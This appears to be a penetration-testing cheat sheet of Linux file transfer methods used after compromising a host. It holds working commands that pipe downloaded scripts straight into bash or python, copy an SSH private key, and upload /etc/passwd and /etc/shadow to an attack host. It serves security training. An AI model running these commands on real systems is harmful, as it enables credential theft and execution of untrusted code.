# Linux File Transfers

## Downloads

### Base64 (No Network)

```bash
# Encode on source
md5sum id_rsa
cat id_rsa | base64 -w 0; echo

# Decode on target
echo -n '<BASE64>' | base64 -d > id_rsa
md5sum id_rsa   # verify hash matches
```

---

### wget / curl

```bash
wget https://<IP>/file.sh -O /tmp/file.sh
curl -o /tmp/file.sh https://<IP>/file.sh
```

**Fileless (pipe directly to interpreter):**

```bash
curl https://<IP>/script.sh | bash
wget -qO- https://<IP>/script.py | python3
```

---

### /dev/tcp (Bash built-in — no tools needed)

Requires Bash 2.04+ compiled with `--enable-net-redirections`.

```bash
exec 3<>/dev/tcp/<IP>/80
echo -e "GET /file.sh HTTP/1.1\n\n">&3
cat <&3
```

---

### SCP (SSH)

```bash
# Start SSH server on attack host (if needed)
sudo systemctl enable ssh && sudo systemctl start ssh
netstat -lnpt   # confirm :22 listening

# Download from remote to local
scp user@<IP>:/root/file.txt .

# Upload from local to remote
scp /etc/passwd user@<IP>:/home/user/
```

---

## Uploads

### HTTPS Upload (uploadserver)

```bash
# Attack host: generate self-signed cert
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

# Start HTTPS upload server (serve cert from outside webroot)
mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

```bash
# Target: upload files
curl -X POST https://<IP>/upload \
  -F 'files=@/etc/passwd' \
  -F 'files=@/etc/shadow' \
  --insecure   # needed for self-signed cert
```

---

### Quick HTTP Server (serve files from target)

Spin up on the compromised host, pull from attack machine.

```bash
python3 -m http.server 8000
python2.7 -m SimpleHTTPServer 8000
php -S 0.0.0.0:8000
ruby -run -ehttpd . -p8000
```

```bash
# Pull from attack host
wget <target-IP>:8000/file.txt
curl <target-IP>:8000/file.txt -o file.txt
```

> Useful when you can't push to the target but can pull from it — browse to the target's webroot and download.

---

### Nginx Upload Server (HTTP PUT)

Better than Apache for this — no PHP execution risk, directory listing off by default.

```bash
# Create upload directory
sudo mkdir -p /var/www/uploads/SecretUploadDirectory
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory

# Create config: /etc/nginx/sites-available/upload.conf
# server {
#     listen 9001;
#     location /SecretUploadDirectory/ {
#         root    /var/www/uploads;
#         dav_methods PUT;
#     }
# }

sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
sudo rm /etc/nginx/sites-enabled/default   # remove default if port 80 conflict
sudo systemctl restart nginx.service
tail -2 /var/log/nginx/error.log           # check for errors
```

```bash
# Upload via curl PUT (from target)
curl -T /etc/passwd http://<attack-IP>:9001/SecretUploadDirectory/users.txt

# Verify received
sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt
```

> Use a non-obvious directory name — Nginx won't list directory contents by default, but don't rely on that.

---

## Quick Reference

| Method | Direction | Needs Network | Notes |
|---|---|---|---|
| Base64 encode/decode | Both | No | Paste via terminal; good for small files |
| wget / curl | Down | Yes | Most common; curl supports fileless pipe |
| /dev/tcp | Down | Yes | No tools required — Bash built-in |
| SCP | Both | Yes | Requires SSH access |
| uploadserver HTTPS | Up | Yes | Self-signed cert — use `--insecure` on curl |
| Python/PHP/Ruby HTTP | Up (pull) | Yes | Start on target; pull from attack host |
